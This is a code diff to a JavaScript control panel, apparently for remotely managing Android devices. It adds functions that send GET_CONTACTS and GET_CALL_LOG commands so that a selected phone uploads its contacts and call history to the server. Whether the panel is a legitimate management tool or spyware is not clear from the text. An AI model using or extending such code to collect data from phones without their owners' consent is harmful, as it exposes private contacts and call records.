@@ -2857,6 +2857,8 @@ document.addEventListener('fullscreenchange', () => {
 // ═══════════════════════════════════════════════════════════════════════════
 let _allContacts = [];
 
+// Load already-synced contacts from the server DB. Called when a device is
+// selected — instant, no round-trip to the device.
 function fetchContacts(deviceId) {
     const id = deviceId || currentDeviceId;
     if (!id) return;
@@ -2864,6 +2866,18 @@ function fetchContacts(deviceId) {
         .then(r => r.json())
         .then(rows => { if (id === currentDeviceId) contactsRender(rows); })
         .catch(e => console.error('fetchContacts:', e));
+}
+
+// Sync = ask the Android device to re-read its ContactsContract provider and
+// send everything back. The panel receives the CONTACTS WS event and renders.
+// (fetchContacts alone only shows what was already synced.)
+function syncContacts() {
+    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }
+    sendCommand('GET_CONTACTS');
+    logToConsole('Solicitando contatos do dispositivo…', 'system');
+    // Belt-and-suspenders: re-poll the DB after the device round-trip so we
+    // still render even if the CONTACTS WS event was missed for any reason.
+    setTimeout(() => fetchContacts(), 3000);
 }
 
 function contactsRender(rows) {
@@ -2913,6 +2927,13 @@ function contactAvatarColor(name) {
 // ═══════════════════════════════════════════════════════════════════════════
 // CALL LOGS
 // ═══════════════════════════════════════════════════════════════════════════
+function syncCallLogs() {
+    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }
+    sendCommand('GET_CALL_LOG');
+    logToConsole('Solicitando registro de ligações do dispositivo…', 'system');
+    setTimeout(() => fetchCallLogs(), 3000);
+}
+
 function fetchCallLogs(deviceId) {
     const id = deviceId || currentDeviceId;
     if (!id) return;
